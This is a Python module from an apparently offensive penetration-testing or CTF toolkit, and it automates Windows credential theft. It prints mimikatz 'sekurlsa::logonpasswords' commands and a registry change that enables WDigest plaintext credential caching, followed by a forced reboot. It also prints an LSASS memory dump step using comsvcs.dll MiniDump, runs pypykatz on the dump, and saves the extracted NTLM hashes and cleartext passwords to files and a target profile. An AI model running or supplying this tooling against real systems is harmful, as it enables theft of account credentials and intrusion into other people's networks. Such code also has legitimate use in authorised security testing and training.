import subprocess
from pathlib import Path
from core.runner import run_module_by_name
from core.target import target_add_cred
import argparse


def run(data, cred, args):

    # =========================================================
    # COLORS
    # =========================================================

    G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
    BOLD = '\033[1m'


    if getattr(args, "windows", False):

        from modules.upload.windows import stage_windows_files
        from core.paths import get_tools_dir

        print(
            f"{B}[?]{W} Transfer Mimikatz?\n"
        )

        print(
            f"  {B}[1]{W} Yes"
        )

        print(
            f"  {B}[2]{W} No\n"
        )

        choice = input(
            f"{Y}Select> {W}"
        ).strip()

        if choice == "1":

            windows_tools = (
                get_tools_dir() /
                "windows"
            )

            stage_windows_files([
                windows_tools / "mimikatz.exe",
            ])

        print()

        print(
            f"{G}[+] Mimikatz{W}\n"
        )

        print(
            f"{Y}mimikatz.exe{W}"
        )

        print()

        print(
            f"{Y}privilege::debug{W}"
        )

        print()

        print(
            f"{Y}sekurlsa::logonpasswords{W}"
        )

        print()

        print(
            f"{G}[+] Enable WDigest (Plaintext Credentials){W}\n"
        )

        print(
            f"{Y}reg add "
            f"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest "
            f"/v UseLogonCredential "
            f"/t REG_DWORD "
            f"/d 1{W}"
        )

        print()

        print(
            f"{Y}shutdown.exe /r /t 0 /f{W}"
        )

        print()

        print(
            f"{G}[+] After Reboot{W}\n"
        )

        print(
            f"{Y}mimikatz.exe{W}"
        )

        print()

        print(
            f"{Y}privilege::debug{W}"
        )

        print()

        print(
            f"{Y}sekurlsa::logonpasswords{W}"
        )

        print()

        return
    # =========================================================
    # ACQUIRE DUMP
    # =========================================================

    answer = input(
        "Create, download and parse LSASS dump? [Y/n]: "
    )

    if answer.lower() in ("", "y", "yes"):

        print(f"\n{BOLD}[*] LSASS MEMORY DUMP{W}")

        print(f"\n{BOLD}[*] Find LSASS PID:{W}")
        print(
            f"      {Y}tasklist /svc | findstr lsass{W}"
        )

        print(f"\n{BOLD}[*] Create Dump:{W}")
        print(
            f"      {Y}rundll32.exe "
            f"C:\\Windows\\System32\\comsvcs.dll,"
            f" MiniDump <PID> C:\\lsass.dmp full{W}"
        )

        print(f"\n{BOLD}[*] Alternative:{W}")
        print(
            f"      {G}Task Manager → LSASS → Create Dump File{W}"
        )

        print(f"\n{BOLD}[*] Transfer:{W}")
        print(
            f"      {C}ctf download.windows lsass.dmp{W}\n"
        )

        run_module_by_name(
            "download.windows",
            ["lsass.dmp"],
            data
        )

    # =========================================================
    # CHECK FILE
    # =========================================================

    dumpfile = Path("lsass.dmp")

    if not dumpfile.exists():

        print(
            f"\n{R}[!] {W}{BOLD}MISSING LSASS DUMP{W}"
        )

        print(
            f"{B}  └── lsass.dmp{W}\n"
        )

        return

    # =========================================================
    # HUD
    # =========================================================

    print(
        f"\n{B}┌── {BOLD}MODULE: LSASS PARSER{W}{B} ─────────────────────┐{W}"
    )

    print(
        f"{B}│{W}  {B}Dump:{W} "
        f"{C}{dumpfile.name:<40}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}└──────────────────────────────────────────────────────────┘{W}"
    )

    # =========================================================
    # COMMAND
    # =========================================================

    cmd = [
        "pypykatz",
        "lsa",
        "minidump",
        str(dumpfile)
    ]

    print(
        f"\n{B}[*]{W} COMMAND\n"
    )

    print(
        f"{Y}{' '.join(cmd)}{W}\n"
    )

    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True
    )

    if result.returncode != 0:

        print(
            f"{R}[!] PYPYKATZ FAILED{W}"
        )

        print(result.stderr)

        return

    print(result.stdout)

    # =========================================================
    # SAVE OUTPUT
    # =========================================================

    output_file = Path(
        "lsass_dump.txt"
    )

    output_file.write_text(
        result.stdout
    )

    print(
        f"\n{G}[+] Output saved:{W} "
        f"{output_file.resolve()}\n"
    )

    # =========================================================
    # PARSE CREDS
    # =========================================================

    recovered = []

    current_user = None

    for line in result.stdout.splitlines():

        line = line.strip()

        if line.startswith("Username:"):

            current_user = (
                line.split(
                    ":",
                    1
                )[1]
                .strip()
            )

        elif line.startswith("NT:"):

            if not current_user:
                continue

            ntlm = (
                line.split(
                    ":",
                    1
                )[1]
                .strip()
            )

            if ntlm == "NA":
                continue

            recovered.append(
                {
                    "user": current_user,
                    "type": "ntlm",
                    "secret": ntlm
                }
            )

        elif line.startswith("password "):
            continue

        elif line.startswith("password:"):

            if not current_user:
                continue

            password = (
                line.split(
                    ":",
                    1
                )[1]
                .strip()
            )

            if (
                not password
                or password == "None"
            ):
                continue

            recovered.append(
                {
                    "user": current_user,
                    "type": "password",
                    "secret": password
                }
            )

    # =========================================================
    # SHOW RESULTS
    # =========================================================

    if not recovered:

        print(
            f"\n{Y}[-] {W}No credentials recovered\n"
        )

        return

    print(
        f"\n{G}[+] {W}Recovered "
        f"{C}{len(recovered)}{W} credential(s)\n"
    )

    for entry in recovered:

        print(
            f"  {B}├──{W} "
            f"{C}{entry['user']}{W} "
            f"{Y}{entry['secret']}{W}"
        )

    print()

    # =========================================================
    # SAVE TO FILE
    # =========================================================

    creds_file = Path(
        "lsass_creds.txt"
    )

    with open(
        creds_file,
        "w"
    ) as f:

        for entry in recovered:

            f.write(
                f"{entry['user']}:"
                f"{entry['secret']}\n"
            )

    print(
        f"{G}[+] {W}Credentials Saved"
    )

    print(
        f"{B}  └── "
        f"{C}{creds_file.resolve()}{W}\n"
    )

    # =========================================================
    # SAVE TO PROFILE
    # =========================================================

    added = 0

    for i, entry in enumerate(recovered):

        is_last = (
            i == len(recovered) - 1
        )

        try:

            target_add_cred(
                argparse.Namespace(
                    user=entry["user"],
                    password=entry["secret"]
                    if entry["type"] == "password"
                    else None,
                    hash=entry["secret"]
                    if entry["type"] == "ntlm"
                    else None,
                    aes=None,
                    ccache=None
                ),
                show=is_last,
                switch=False
            )

            added += 1

        except Exception:
            pass

    print(
        f"{G}[+] {W}Added "
        f"{C}{added}{W} credential(s) "
        f"to target profile\n"
    )